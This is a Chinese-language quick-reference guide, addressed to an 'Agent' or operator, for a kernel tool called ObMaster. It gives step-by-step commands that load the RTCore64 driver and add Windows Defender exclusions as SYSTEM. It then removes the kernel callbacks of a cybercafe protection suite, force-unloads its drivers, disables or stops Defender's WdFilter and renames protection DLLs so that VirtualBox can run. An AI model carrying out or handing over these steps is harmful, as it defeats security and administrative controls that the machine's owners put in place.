# ObMaster 实战操作指南

> 给 Agent 或操作员看的快速参考。
> 详细原理见 ksafe_architecture.md 和 VBOX_DEBUG.md。
>
> **核心原则：倒着拆弹 — 按注册的逆序拆除每层防护，正序拆会触发死锁或僵尸状态。**

---

## 0. 部署（每次开机执行一次）

```bash
# 管理员 PowerShell：
sc create RTCore64 type=kernel binPath=C:\Windows\System32\drivers\RTCore64.sys
sc start RTCore64
Add-MpPreference -ExclusionProcess "ObMaster.exe"
Add-MpPreference -ExclusionProcess "VirtualBoxVM.exe"
Add-MpPreference -ExclusionPath "C:\Program Files\Oracle\VirtualBox"

# 如果 Add-MpPreference 被拦截，用 /runas system 以 SYSTEM 权限写注册表：
ObMaster /runas system reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v VirtualBoxVM.exe /t REG_DWORD /d 0 /f
ObMaster /runas system reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v ObMaster.exe /t REG_DWORD /d 0 /f
ObMaster /runas system reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\Program Files\Oracle\VirtualBox" /t REG_DWORD /d 0 /f
```

验证：
```bash
ObMaster /info
ObMaster /ptebase --method 10
```

两个都有输出 = 就绪。

---

## 1. MmPteBase（必须第一步）

```bash
# 首选：PDB 符号解析（需联网或符号缓存）
ObMaster /ptebase --method 1

# 备选：从 MiGetPteAddress 机器码提取（离线可用）
ObMaster /ptebase --method 10

# 如果两个都失败，用 kd 手动读：
sudo "C:/Program Files (x86)/Windows Kits/10/Debuggers/x64/kd.exe" -kl -c "dq nt!MmPteBase L1; q"
# 然后手动注入：
ObMaster /ptebase-set <值>
```

**⚠ 每次重启后值会变（KASLR），必须重新获取。**

---

## 2. 确认 PTE 可写（第二步）

```bash
# 找一个不在大页上的地址测试（用第三方驱动，不要用 ntoskrnl）
ObMaster /drivers                           # 找 ksafecenter64 或其他第三方驱动的基址
ObMaster /sp-test <驱动基址>                 # 三个 Stage 全 PASS = 可以 safepatch
```

**⚠ 绝对不要对 ntoskrnl 的地址跑 sp-test——它在大页上，会蓝屏。**

常见结果：
- Stage 1 SKIP "large page" → 换一个地址（选第三方驱动）
- Stage 2 FAIL → HVCI 启用，safepatch 不可用
- Stage 3 PASS → safepatch 完全可用

---

## 3. 云更新驱动拆除（19 步，严格按顺序）

**⚠ 绝对不能直接 /force-stop 保护驱动。必须先拆回调再卸驱动。**

### 拆除顺序的原因

```
注册顺序:  Device → ImageNotify → ObCallback → CmCallback → MiniFilter
拆除顺序:  CmCallback → ObCallback → ImageNotify → MiniFilter → Device → Unload
           ↑ 必须最先拆，否则后续 SCM 操作全部被拦截
```

| 规则 | 原因 |
|------|------|
| CmCallback 最先拆 | 它锁住注册表，不拆它后续 SCM 全部 ACCESS_DENIED |
| ObCallback 第二拆 | 它拦截 OpenProcess，不拆它杀不了用户态进程 |
| Notify 第三拆 | 它监控进程/DLL 加载，不拆它保护组件会重生 |
| MiniFilter 第四拆 | 文件隐藏，影响最小但阻碍取证 |
| ksafecenter64 先于 kshutdown64 | kshutdown 依赖 ksafe 的 ObCallback 保护 |
| kboot64 和 ksafe 并列 | 两者都有 CmCallback，互相掩护 |

### Phase 1：拆回调（不卸驱动）

> `/notify registry` 同时使用数组扫描 + 链表遍历（CallbackListHead）。
> Win10 19041+ 的 CmCallback 在链表中，两种模式自动合并。
> ProcessNotify 的 stale entry（0x06 非法指令、LIST_ENTRY 自引用）会被自动过滤。

```bash
# ① ② 先杀 CmCallback（解锁注册表，最优先！）
ObMaster /notify registry --kill ksafecenter64
ObMaster /notify registry --kill kboot64

# ③ 杀 ObCallback（解锁 handle 访问）
ObMaster /obcb
ObMaster /disable <ksafe_PreOp_addr>          # 从 /obcb 输出里找地址

# ④-⑨ 杀 Notify（解除进程/DLL 监控）
#   每次 /ndisable 前先跑对应的 /notify 查地址
ObMaster /notify image
ObMaster /ndisable <ksafe_image_addr>
ObMaster /notify process
ObMaster /ndisable <kshutdown_process_addr>
ObMaster /notify image
ObMaster /ndisable <kshutdown_image_addr>
ObMaster /notify process
ObMaster /ndisable <kboot_process_addr>
ObMaster /notify image
ObMaster /ndisable <kboot_image_addr>
ObMaster /notify process
ObMaster /ndisable <kcachec_process_addr>

# ⑩ 卸 MiniFilter
ObMaster /flt-detach ksafecenter64 C:
```

**⚠ 注意：** `/notify process` 输出可能有大量 `[skip:bad block]`，
不代表没有云更新条目 — 可能是 DKOM 干扰。如果 evil handle 未消失，
需要逐个验证被 skip 的 slot。

**Phase 1 完成后，测试 VBox：**
```bash
"C:\Program Files\Oracle\VirtualBox\VirtualBoxVM.exe" --startvm <虚拟机名>
```
检查 VBoxHardening.log：
- `evil handle` 行消失 = Phase 1 成功（ksafe 回调已拆干净）
- 仍有 `evil handle` = 回去检查 Phase 1 哪个 notify 漏了
- evil handle 消失但 exit code `0xC0000409` = kshutdown64 APC 注入仍活跃（Phase 2 解决）
- 记录 VBox 存活时间（ms），用于对比后续阶段进展（典型值：Phase 1 后 ~4000ms 被杀）

### Phase 2：卸载保护驱动

**所有云更新驱动均无 DriverUnload（故意设计：加载不走）。**
`/force-stop` 内部会自动 patch DriverUnload 为 ret stub 再调 NtUnloadDriver。

```bash
# 先试直接 force-stop
# ⚠ 服务名不带 64！驱动文件叫 ksafecenter64.sys，但服务名/驱动对象名不带 64
ObMaster /force-stop ksafecenter --force
ObMaster /force-stop kshutdown --force
ObMaster /force-stop kboot --force
ObMaster /force-stop kcachec --force
```

**如果 /force-stop 失败（常见原因及处理）：**

| 错误 | 原因 | 解法 |
|------|------|------|
| `STATUS_OBJECT_NAME_NOT_FOUND` (0xC0000034) | 注册表无服务条目 | 走 /objdir + /drv-unload 路径（见下方） |
| `STATUS_INVALID_DEVICE_REQUEST` (0xC0000010) | DriverUnload = NULL 或空壳 | /drv-unload 会自动 patch；如果 patch 后仍失败 → /nuke-driver |
| `OpenService: 1060` | SCM 找不到服务 | 走 /objdir + /drv-unload 路径；检查服务名是否带了多余的 64 |
| `OpenService: 5` (ACCESS_DENIED) | CmCallback 仍在拦截 SCM | 回去检查 Phase 1 是否拆干净 |
| WARNING: N DeviceObject(s) still attached | DeviceObject 阻止卸载 | 需清零 DeviceObject 链（见下方） |

**完整的手动卸载流程（DKOM 驱动，当 /force-stop 失败时）：**

```bash
# 步骤 1. 从根命名空间找 \Driver 目录 KVA
ObMaster /objdir \\
#   记下 Driver 条目的 Object Addr

# 步骤 2. 绕过 DACL 枚举 \Driver，找目标驱动的 DRIVER_OBJECT
ObMaster /objdir --kva <Driver目录KVA>
#   ⚠ 输出两列地址：第一列 = DRIVER_OBJECT（用这个），第二列 = OBJECT_HEADER（不用）

# 步骤 3. patch DriverUnload + 尝试 SCM stop
ObMaster /drv-unload <驱动名> <DRIVER_OBJECT地址>
#   如果报 WARNING: DeviceObject still attached → 步骤 4
#   如果报 OpenService 失败 → 步骤 5

# 步骤 4. 清零 DeviceObject 链（防止 IopUnloadDriver 僵尸检查）
#   需要手动 Wr64 清零 DriverObject->DeviceObject (+0x008) 指针
#   ⚠ 这会让内核丢失设备引用，仅在确认回调已全部拆除后执行

# 步骤 5. 重试 force-stop（DriverUnload 已被 patch）
ObMaster /force-stop <驱动名> --force

# 步骤 6. 如果仍然失败 → /nuke-driver（功能性杀死，重启后消失）
ObMaster /nuke-driver <服务名> <DRIVER_OBJECT地址>

# 步骤 7. 真正的干净卸载 → IOCTL 通道（推荐，见下方）
```

**⚠ /nuke-driver 的局限：**
- NtUnloadDriver 返回 SUCCESS，但 MmUnloadSystemImage **不会执行**
- 文件锁不释放，驱动**无法重新加载**（直到重启）
- 原因：DeviceObject 成了孤儿，内核等待引用清零但没人调 IoDeleteDevice
- **nuke-driver 只适合"杀死功能 + 等重启"的场景，不能做到卸载后立即重装**

### 正确的卸载方式：PnP Remove（厂商实际使用的方法）

**核心发现（NSIS 脚本反编译确认）：**
厂商的卸载程序不用 IOCTL 通知驱动自清理。它用 **PnP 设备移除**——
让 Windows 的 PnP 管理器替它调 `IoDeleteDevice`。

KScsiDisk64 通过 `IoCreateDevice` 注册了虚拟 PnP 设备适配器（`kscsidiskadapter`）。
厂商的卸载脚本调 `devcon64.exe remove kscsidiskadapter`，Windows PnP 管理器发送
`IRP_MN_REMOVE_DEVICE` → 驱动处理移除 → `IoDeleteDevice` → DeviceObject 释放
→ `MmUnloadSystemImage` → 文件锁释放 → 可重新加载。

**不需要 devcon。Windows 自带 `pnputil.exe` 功能相同。**

**实战操作步骤：**

```bash
# ── 步骤 1：用 /nuke-driver 清理回调（阻止干扰）──
ObMaster /objdir \\
#   记下 Driver 条目的 Object Addr
ObMaster /objdir --kva <Driver目录KVA>
#   记下目标驱动的 DRIVER_OBJECT 地址
ObMaster /nuke-driver <服务名> <DRIVER_OBJECT地址>
#   清除 Notify/CmCallback → MajorFunction 重定向 → DriverUnload 设 ret stub

# ── 步骤 2：PnP 移除设备（关键步骤）──
# 方法 A：用 pnputil（Windows 自带，无需额外工具）
pnputil /remove-device <设备实例ID>
#   设备实例 ID 从设备管理器或 pnputil /enum-devices 获取

# 方法 B：用 devcon（需要 WDK 或从安装包提取）
devcon64.exe remove kscsidiskadapter

# 方法 C：直接调 SetupAPI（ObMaster 未来功能）
#   SetupDiCallClassInstaller(DIF_REMOVE, ...)

# ── 步骤 3：停止并删除服务 ──
sc stop <服务名>
sc delete <服务名>

# ── 步骤 4：验证 ──
ObMaster /drivers                 # 驱动应消失或显示 Stopped
sc start <服务名>                 # 能重新加载 = 干净卸载成功
```

**驱动内部清理路径（ppm 逆向确认，供参考）：**

| 函数 RVA | 清理操作 | 调用的内核 API |
|----------|---------|---------------|
| `0x7894` | 清除 ObCallback | `ObUnRegisterCallbacks` |
| `0x7958` | 跳转到 0x7894 | （thunk） |
| `0x69FC` | 清除 ImageNotify | `PsRemoveLoadImageNotifyRoutine(0x6FAC)` |
| `0x15A8` 错误路径 | 删除设备 | `IoDeleteDevice`（用全局存的 DevObj 指针） |

**所有卸载方案对比：**

| 方案 | 结果 |
|------|------|
| `sc stop` | 1052 — 驱动不接受 STOP |
| `NtUnloadDriver` | 0xC0000010 — DriverUnload 空壳 |
| `/force-stop` + ret stub | NtUnloadDriver SUCCESS 但文件仍锁 |
| `/nuke-driver` | 功能性死亡但文件锁不放，无法重装 |
| PsLoadedModuleList 摘链 | BSOD 0x50（竞态） |
| IOCTL 通道 | 只用于运行时控制，厂商卸载程序不使用 |
| **PnP remove (pnputil/devcon)** | **PnP 管理器调 IoDeleteDevice → MmUnloadSystemImage → 干净卸载** |

**Phase 2 完成后，测试 VBox：**
```bash
"C:\Program Files\Oracle\VirtualBox\VirtualBoxVM.exe" --startvm <虚拟机名>
```
检查结果：
- VBox 正常启动 = 完成，不需要 Phase 3
- exit code `0xC0000409` = kshutdown64 驱动已卸但 kshut64.dll 可能已被注入（见第 5 节 APC 对策）
- 仍有 `evil handle` = 驱动未真正卸载（僵尸），用 `/drivers` 确认状态
- 记录存活时间：Phase 2 后应显著延长或无限（不再被杀）

### Phase 3：卸载非保护驱动（可选）

```bash
ObMaster /force-stop krestore64
ObMaster /force-stop KScsiDisk64
ObMaster /force-stop kdisk64
ObMaster /force-stop kantiarp64
ObMaster /force-stop kpowershutdown64
```

---

## 4. WdFilter 处理

**不需要卸载，加排除规则即可：**

```bash
# 以 SYSTEM 权限写入（普通 Admin 写入失败）
ObMaster /runas system reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v VirtualBoxVM.exe /t REG_DWORD /d 0 /f
ObMaster /runas system reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\Program Files\Oracle\VirtualBox" /t REG_DWORD /d 0 /f
```

如果排除规则不够（VBox 仍在 Respawn#2 崩溃），升级手段：
```bash
# 禁用 WdFilter ObCallback（阻止 ntdll hook 注入）
ObMaster /obcb                                  # 找 WdFilter 的 ObCallback
ObMaster /disable <WdFilter_PreOp_addr>         # 清零 Pre 指针

# 禁用 WdFilter LoadImage notify（阻止 Respawn#2 的 ntdll 被异步 hook）
ObMaster /notify image
ObMaster /ndisable <WdFilter_image_addr>        # WdFilter.sys +0x3ce80

# 终极手段：直接停止 WdFilter
ObMaster /runas system "net stop WdFilter /y"
```

**⚠ WdFilter Pre 指针清零后需要记录原始值，恢复时要写回。**

---

## 5. kshutdown64 APC 注入对策

**kshutdown64.sys 是真正杀 VBox 的凶手**（不是 ksafecenter64）。

攻击链：
```
kshutdown64 CreateProcess 回调触发
  → 检查新进程名（不在白名单 = 杀）
  → ZwOpenProcess 打开目标
  → KeInitializeApc + KeInsertQueueApc 注入 APC
  → VBox 线程返回用户态时 APC 触发
  → LdrLoadDll("kshut64.dll")
  → kshut64.dll DllMain 执行 TerminateProcess(self, 0xC0000409)
  → VBox 以 STATUS_STACK_BUFFER_OVERRUN 退出（伪装成 GS cookie 失败）
```

**对策（三步都要做）：**
```bash
# 方案 1：Phase 1 已禁用 kshutdown64 的 CreateProcess notify
#   → 回调不触发，APC 不会被注入

# 方案 2：隐藏 kshut64.dll（APC 注入的 LdrLoadDll 找不到文件 → 失败 → VBox 无损）
# 已知位置：
#   C:\Windows\System32\kshut64.dll   ← 64 位
#   C:\Windows\System32\kshut.dll     ← 32 位
#   C:\Windows\SysWOW64\kshut.dll     ← 32 位 WoW64
ren C:\Windows\System32\kshut64.dll kshut64.dll.bak
ren C:\Windows\System32\kshut.dll   kshut.dll.bak
ren C:\Windows\SysWOW64\kshut.dll   kshut.dll.bak

# 方案 3（关键！）：从 winlogon.exe 卸载已注入的 kshut64.dll
#   ⚠ 重命名文件只能阻止新注入，但如果 kshut64.dll 已经被注入到 winlogon 里，
#   它在内存中继续运行，不需要文件。必须用 /wluninject 从 winlogon 卸载。
# 先扫描所有进程找 kshut64.dll（不只是 winlogon！kshutdown64 也会注入 explorer 等）
powershell "Get-Process | % { try { $_.Modules | ? ModuleName -like '*kshut*' | % { '{0} (PID {1}): {2}' -f $_.ProcessName,$_.Id,$_.ModuleName } } catch {} }"
ObMaster /wluninject-all kshut64.dll            # 从所有进程卸载（不只是 winlogon）
ObMaster /wluninject-all kshut.dll              # 32 位版本也要处理
```

**⚠ exit code 0xC0000409 不是 VBox 自身崩溃，是 kshutdown64 伪装的。**
**⚠ 三个方案不是"任选其一"，而是要全部执行：禁用 notify 防新注入 + 重命名文件防重载 + wluninject 清除已注入的。**

---

## 6. 启动 VirtualBox

```bash
# 云更新回调已拆、WdFilter 已排除、kshutdown APC 已中和，现在启动 VBox
"C:\Program Files\Oracle\VirtualBox\VirtualBoxVM.exe" --startvm <虚拟机名>
```

**检查 VBoxHardening.log 确认结果：**
- 无 `evil handle` 行 + 无 `0xC0000409` + VM 窗口弹出 = 成功
- 如果仍然失败，用 grep 检查日志关键字：
```bash
grep -E "evil handle|Error -|STATUS_|0xc000" VBoxHardening.log
```

---

## 7. 常用诊断

```bash
ObMaster /bsod --after td                       # 查看今天的蓝屏
ObMaster /v2p <虚拟地址>                         # VA → PA
ObMaster /p2v <物理地址>                         # PA → VA
ObMaster /pte <地址>                             # 完整页表遍历
ObMaster /obcb                                  # ObCallback 状态
ObMaster /notify image                          # ImageNotify 状态
ObMaster /notify registry                       # CmCallback 状态
ObMaster /flt C:                                # MiniFilter 状态
ObMaster /drivers                               # 已加载驱动
```

---

## 各驱动角色与威胁等级

**⚠ 驱动文件名带 64，但服务名/驱动对象名不带 64：**

| 驱动文件 | 服务名（/force-stop 用） | \Driver 对象名 |
|----------|------------------------|---------------|
| ksafecenter64.sys | `ksafecenter` | `\Driver\ksafecenter` |
| kshutdown64.sys | `kshutdown` | `\Driver\kshutdown` |
| kboot64.sys | `kboot` | `\Driver\kboot` |
| kcachec64.sys | `kcachec` | `\Driver\kcachec` |

| 驱动 | 类型 | 对 VBox 威胁 | 关键能力 |
|------|------|-------------|---------|
| **ksafecenter64.sys** | protection_minifilter | **高** (L1-L3) | ObCallback + CmCallback + ImageLoad notify + MiniFilter；无 DriverUnload；DKOM 隐藏 |
| **kshutdown64.sys** | apc_injector | **高** (L4) | APC 注入 kshut64.dll 杀非白名单进程；Process/Image notify；无 DriverUnload |
| **kboot64.sys** | apc_injector | **高** | CmCallback + APC 注入 + EPROCESS DKOM；无 DriverUnload |
| **kcachec64.sys** | process_monitor | **中** | ProcessNotify 进程监控；无 DriverUnload |
| krestore64.sys | generic_driver | 低 | 磁盘影子还原；有 DKOM 能力 |
| KScsiDisk64.sys | process_monitor | 低 | SCSI 磁盘 + Process/Image notify |
| kdisk64.sys | generic_driver | 无 | 磁盘控制 |
| kantiarp64.sys | generic_driver | 无 | ARP 防火墙 |
| kpowershutdown64.sys | generic_driver | 无 | 电源控制 |

**ksafecenter64 的多层干扰机制（完整图谱）：**

| 层 | 机制 | 影响 | 绕过方法 |
|----|------|------|---------|
| L1 | ObCallback PreOp | 剥夺外部对受保护进程的权限 | `/disable` |
| L2 | CreateProcess Notify (+0x6fac) | 内核打开 OBJ_KERNEL_HANDLE → evil handle | `/ndisable` |
| L3 | DKOM（ActiveProcessLinks 摘链）| FindEPROCESS 失败 | NtQSI fallback（已内置） |
| L4 | kshutdown64 APC 注入 | ~4秒后 TerminateProcess(VBox, 0xC0000409) | `/ndisable` 或隐藏 kshut64.dll |

---

## ⚠ MmPteBase 是什么、不是什么

**MmPteBase 是页表自映射基址，不是可操作的目标地址。**

```
/ptebase --method 10 输出: MmPteBase = 0xFFFF8D0000000000
```

这个值的用途：
- ✅ ObMaster 内部用它计算任意虚拟地址的 PTE 位置（/pte、/safepatch、/v2p）
- ✅ 验证是否正确：/ptebase --method 10 拿到后自动缓存，后续命令自动使用
- ✅ 手动覆盖：/ptebase-set <值>（当自动扫描被 DKOM 污染时）

**绝对不能拿 MmPteBase 的值去做以下操作：**
- ❌ `/sp-test 0xFFFF8D0000000000` — 这是页表页，PTE swap 会摧毁所有虚拟映射 → 立即 BSOD
- ❌ `/safepatch 0xFFFF8D0000000000 C3` — 同上
- ❌ `/pte` 输出的 PTE VA / PDE VA / PDPTE VA / PML4E VA 也不能拿去跑 /sp-test 或 /safepatch — 它们同样是页表页
- ❌ 把 MmPteBase 当成"驱动基址"或"函数地址"传给任何写入操作

**简单判断规则：** 地址在 `MmPteBase .. MmPteBase+512GB` 范围内 = 页表页 = 不能碰。
代码已内置拦截（PteSafetyCheck），但不要依赖拦截 — 从认知上就不该尝试。

**什么地址可以给 /sp-test：**
- ✅ 第三方驱动基址（从 `/drivers` 输出获取，如 KScsiDisk64.sys 的基址）
- ✅ 第三方驱动的函数地址（基址 + RVA）
- ❌ ntoskrnl.exe 地址（大页，没有 PTE 层）
- ❌ MmPteBase 及其衍生的页表地址

---

## 禁止事项

| 操作 | 后果 |
|------|------|
| 不拆回调直接 /force-stop 保护驱动 | BSOD（CmCallback 锁注册表） |
| 对 ntoskrnl 地址跑 /sp-test | BSOD（大页没有 PTE） |
| 对 MmPteBase 或页表地址跑 /sp-test、/safepatch | BSOD（页表页 PTE swap 摧毁所有虚拟映射） |
| 用旧的 MmPteBase 值（重启后未更新） | BSOD（PTE walk 读错地址） |
| 乱序拆回调（先拆 ObCallback 再拆 CmCallback） | SCM 被锁，后续操作失败 |
| 重启后不重新部署 | 云更新还原所有内存改动 |
| 对 ksafecenter64 使用 /safepatch 或 /patch | BSOD（PTE 操作 + MmPteBase 不稳定 + 多核竞态）|
| safepatch 函数中间的调用点（非入口） | BSOD（栈帧损坏或返回值垃圾）。**只能 patch 函数入口写 C3** |
| 服务停止 ≠ 驱动卸载 | 驱动代码仍驻留内核，持续 patch 内存 |
| /force-stop 失败后不走 /objdir + /drv-unload 路径 | 驱动变僵尸，无法卸载 |

---

## 快速检查清单

```
=== 部署 ===
[ ] RTCore64 已启动          → ObMaster /info
[ ] MmPteBase 已获取         → ObMaster /ptebase --method 10
[ ] sp-test 三个 Stage PASS  → ObMaster /sp-test <非大页地址>

=== Phase 1: 拆回调 ===
[ ] CmCallback 已拆          → ObMaster /notify registry（应无 ksafe/kboot）
[ ] ObCallback 已拆          → ObMaster /obcb（应无 ksafe entry）
[ ] ImageNotify 已拆         → ObMaster /notify image（应无 ksafe/kshutdown/kboot）
[ ] ProcessNotify 已拆       → ObMaster /notify process（应无 kshutdown/kboot/kcachec）
[ ] MiniFilter 已卸          → ObMaster /flt C:（应无 ksafecenter64）

=== Phase 2: 卸载保护驱动 ===
[ ] ksafecenter64 已卸载     → ObMaster /drivers（应无 ksafecenter64 或显示 Stopped）
[ ] kshutdown64 已卸载       → 同上
[ ] kboot64 已卸载           → 同上
[ ] kcachec64 已卸载         → 同上

=== WdFilter + VBox ===
[ ] WdFilter 已排除          → Defender 排除规则已加
[ ] kshutdown APC 已中和     → kshut64.dll 已重命名或 notify 已禁用
[ ] VBox 启动成功            → VirtualBoxVM.exe --startvm
```
